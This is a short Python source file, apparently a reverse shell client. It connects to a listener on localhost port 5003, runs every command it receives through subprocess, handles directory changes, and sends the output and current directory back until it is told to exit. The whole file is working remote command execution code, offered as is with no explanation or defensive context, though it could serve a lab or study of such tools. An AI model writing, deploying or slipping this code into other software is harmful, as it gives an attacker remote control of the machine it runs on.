#!/ur/bin/env python

# Author:Gokan Bektas
# Description: 

import socket
import os
import subprocess
import sys

SERVER_HOST = 'localhost'
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPERATOR = '<sep>'

sock = socket.socket()
sock.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd() #current working directory
sock.send(cwd.encode())

while True:
    command = sock.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == 'exit':
        break
    if splited_command[0].lower() == 'cd': #change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f'{output}{SEPERATOR}{cwd}'
    sock.send(message.encode())
    
sock.close()